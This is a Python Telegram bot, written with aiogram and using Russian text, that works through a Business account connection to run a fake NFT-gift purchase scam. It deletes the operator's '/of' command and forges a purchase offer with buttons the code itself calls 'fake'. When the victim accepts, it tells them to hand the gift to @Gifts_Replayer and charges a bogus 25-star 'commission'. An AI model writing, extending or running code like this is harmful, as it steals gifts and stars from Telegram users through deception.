import asyncio
import os
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions,
    LabeledPrice, PreCheckoutQuery
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

def get_pretty_name(slug):
    raw_name = slug.split('-')[0]
    return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)

@dp.business_message(F.text.startswith("/of"))
async def handle_offer_command(message: types.Message):
    business_connection_id = message.business_connection_id
    if not business_connection_id:
        return
    parts = message.text.split()
    if len(parts) < 3:
        return
    link = parts[1]
    try:
        amount = int(parts[2])
    except ValueError:
        return
    match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
    if not match:
        return
    gift_slug = match.group(1)
    pretty_name = get_pretty_name(gift_slug)
    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name

    try:
        await bot.delete_business_messages(
            business_connection_id=business_connection_id,
            message_ids=[message.message_id]
        )
        caption_text = (
            f"Пользователь ({username})\n"
            f"предлагает вам\n"
            f"<b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a>."
        )
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{gift_slug}:{amount}"),
                InlineKeyboardButton(text="Принять", callback_data=f"accept:{gift_slug}:{amount}")
            ]
        ])
        await bot.send_message(
            chat_id=message.chat.id,
            text=caption_text,
            reply_markup=keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
        )
    except Exception as e:
        print(f"Ошибка отправки: {e}")

@dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
async def handle_fake_buttons(callback: types.CallbackQuery):
    if not callback.message:
        await callback.answer("Сообщение не найдено.", show_alert=True)
        return
    data_parts = callback.data.split(":")
    action = data_parts[0]
    gift_slug = data_parts[1]
    amount = data_parts[2]
    link = f"https://t.me/nft/{gift_slug}"
    pretty_name = get_pretty_name(gift_slug)
    business_connection_id = callback.message.business_connection_id

    try:
        await bot.delete_business_messages(
            business_connection_id=business_connection_id,
            message_ids=[callback.message.message_id]
        )
        if action == "accept":
            # 1. Отправляем сообщение об успехе с кнопкой для отправки звезд (счета)
            new_text = (
                f"🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n"
                f"• Передайте подарок пользователю <a href='https://t.me/Gifts_Replayer'>@Gifts_Replayer</a> для зачисления звёзд.\n\n"
                f"<i>👉 Для передачи NFT необходимо оплатить комиссию в 25 звёзд.</i>"
            )
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Отправить за 25 звёзд", callback_data=f"pay_transfer:{gift_slug}")]
            ])
            await bot.send_message(
                chat_id=callback.message.chat.id,
                text=new_text,
                reply_markup=keyboard,
                business_connection_id=business_connection_id,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
            )
        else:
            new_text = f"❌ Оффер на <b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен."
            await bot.send_message(
                chat_id=callback.message.chat.id,
                text=new_text,
                business_connection_id=business_connection_id,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
            )
        await callback.answer()
    except Exception as e:
        print(f"Ошибка: {e}")
        await callback.answer("Произошла ошибка.", show_alert=True)

# Обработка кнопки "Отправить за 25 звёзд" (выставление счёта)
@dp.callback_query(F.data.startswith("pay_transfer:"))
async def handle_pay_transfer(callback: types.CallbackQuery):
    gift_slug = callback.data.split(":")[1]
    business_connection_id = callback.message.business_connection_id
    try:
        # Отправляем счёт на 25 звёзд (валюта XTR)
        await bot.send_invoice(
            chat_id=callback.message.chat.id,
            title=f"Передача подарка {gift_slug}",
            description="Комиссия за передачу NFT-подарка получателю.",
            payload=f"transfer_gift_{gift_slug}",
            provider_token="",  # Для звёзд не требуется
            currency="XTR",
            prices=[LabeledPrice(label="Комиссия за передачу", amount=25)],
            business_connection_id=business_connection_id
        )
        await callback.answer()
    except Exception as e:
        print(f"Ошибка выставления счёта: {e}")
        await callback.answer("Не удалось выставить счёт.", show_alert=True)

# Подтверждение оплаты (обязательный шаг для звёзд)
@dp.pre_checkout_query()
async def process_pre_checkout(pre_checkout_query: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

# Обработка успешной оплаты
@dp.message(F.successful_payment)
async def process_successful_payment(message: types.Message):
    # Здесь можно добавить логику автоматической передачи подарка,
    # но пока просто уведомляем пользователя.
    await message.reply("✅ Оплата прошла успешно! Теперь вы можете передать подарок.")\n
async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
